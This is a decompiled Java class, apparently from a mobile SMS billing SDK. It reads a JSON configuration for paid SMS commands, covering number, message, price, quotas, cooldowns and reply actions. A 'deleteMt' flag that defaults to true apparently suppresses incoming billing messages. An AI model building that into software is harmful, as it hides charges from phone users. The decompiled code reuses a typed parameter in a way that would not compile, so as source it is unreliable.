package com.upay.billing.bean;

import com.upay.billing.UpayCore;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

public class Cmd
  implements Serializable
{
  private static final long serialVersionUID = 1L;
  public HashMap<String, ArrayList<Action>> actions;
  public String btKey;
  public String cdKey;
  public int dayQuota;
  public boolean deleteMt;
  public String key;
  public int monthQuota;
  public String msg;
  public String num;
  public int price;
  public PriceType priceType = PriceType.FIXED;
  public int type;
  public int weight;
  
  public Cmd(UpayCore paramUpayCore, Json paramJson)
  {
    this.key = paramJson.getStr("key");
    this.btKey = paramJson.getStr("bt_key");
    this.num = paramJson.getStr("num");
    this.msg = paramJson.getStr("msg");
    this.price = paramJson.getInt("price");
    this.cdKey = paramJson.getStr("cd_key", "");
    this.type = paramJson.getInt("type");
    this.priceType = PriceType.valueOf(paramJson.getInt("price_type"));
    if (!Util.empty(this.cdKey)) {
      paramUpayCore.updateCooldown(this.cdKey, paramJson.getInt("cd_interval", Integer.valueOf(0)).intValue());
    }
    this.dayQuota = paramJson.getInt("day_quota", Integer.valueOf(Integer.MAX_VALUE)).intValue();
    this.monthQuota = paramJson.getInt("month_quota", Integer.valueOf(Integer.MAX_VALUE)).intValue();
    this.weight = paramJson.getInt("weight", Integer.valueOf(100)).intValue();
    this.deleteMt = paramJson.getBool("delete_mt", Boolean.valueOf(true)).booleanValue();
    this.actions = new HashMap();
    paramJson = Util.safeIter(paramJson.getArray("actions")).iterator();
    while (paramJson.hasNext())
    {
      Object localObject1 = (Json)paramJson.next();
      Object localObject2 = ((Json)localObject1).getStr("mt_num");
      ArrayList localArrayList = new ArrayList();
      this.actions.put(localObject2, localArrayList);
      localObject1 = Util.safeIter(((Json)localObject1).getArray("keys")).iterator();
      while (((Iterator)localObject1).hasNext())
      {
        localObject2 = paramUpayCore.getAction(((Json)((Iterator)localObject1).next()).asStr());
        if (localObject2 != null) {
          localArrayList.add(localObject2);
        }
      }
    }
  }
  
  public String toString()
  {
    return "Cmd(key=" + this.key + ",btKey=" + this.btKey + ",cdKey=" + this.cdKey + ",msg=" + this.msg + ")";
  }
}
